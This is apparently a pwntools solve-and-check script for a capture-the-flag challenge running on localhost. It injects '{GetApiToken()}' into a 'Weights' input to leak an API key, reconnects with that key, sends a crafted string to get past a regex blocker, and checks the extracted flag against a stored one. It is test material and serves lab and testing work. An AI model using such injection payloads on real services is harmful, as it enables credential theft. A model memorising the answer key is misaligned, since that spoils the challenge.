from pwn import *
import re

# Define the target host and port
host = "127.0.0.1"
port = 25004

max_score = 255

# Connect to the remote service
r = remote(host, port)

stored_flag = open("./flag.txt").read().replace("\n","")

# Let banner load first.
while True:
    line = r.recv(4096)
    print(line)
    if b"mode:" in line:
        r.sendline(b"\n")
        break

while True:
    line = r.recv(4096)
    print(line)
    if b"Enter an option:" in line:
        r.sendline(b"1\n")
        print("1")
        break

while True:
    line = r.recv(4096)
    print(line)
    if b"Weights:" in line:
        r.sendline(b"{GetApiToken()}\n")
        print("{GetApiToken()}")
        break

while True:
    line = r.recv(4096)
    print(line)
    if b"Enter an option:" in line:
        r.sendline(b"4\n")
        print("4")
        break

api_key=""
line=b""
while True:
    line += r.recv(4096)
    print(line)
    if b"a uses weight" in line:
        line=line.decode('utf-8')
        print(f"decoded: {line}")
        for parsed in line.split('\n'):
            if "a uses weight" in parsed:
                api_key = re.sub("a uses weight ([^\n]+)", "\\1", parsed)
            print(f"parsed: {parsed}")
        print(f"API key: {api_key}")
        break

r.close()
r = remote(host, port)

while True:
    line = r.recv(4096)
    print(line)
    if b"mode:" in line:
        r.sendline(api_key.encode('utf-8') + b"\n")
        break

while True:
    line = r.recv(4096)
    print(line)
    if b"Enter an option:" in line:
        r.sendline(b"1\n")
        print("1")
        break

while True:
    line = r.recv(4096)
    print(line)
    if b"Weights:" in line:
        r.sendline(b'{Two.Second.Scholars.Mass.And.Partialities.Biases.RegexBlocker="",""}\n')
        print('{Two.Second.Scholars.Mass.And.Partialities.Biases.RegexBlocker="",""}')
        break

while True:
    line = r.recv(4096)
    print(line)
    if b"Enter an option:" in line:
        r.sendline(b"3\n")
        print("3")
        break

line = b""
while True:
    temp = r.recv(4096)
    line += temp
    print(temp)
    if b"sun{evil" in line and b"money}" in line:
        line=line.decode('utf-8')
        for parsed in line.split('\n'):
            if "sun{evil" in parsed and "money}" in parsed:
                flag = parsed.replace("\n","")
        break

# Close the connection when done
r.close()

if not stored_flag in flag:
    print(f"Challenge decode failed!\nflag found:\n{flag}\nofficial challenge flag:\n{stored_flag}")
    compare = zip(flag, stored_flag)
    for a,b in compare:
        if a != b:
            print(f"{a} != {b}")
    exit(1)
else:
    print(f"Challenge decode successful!\nflag found:\n{flag}\nofficial challenge flag:\n{stored_flag}")
    exit(0)
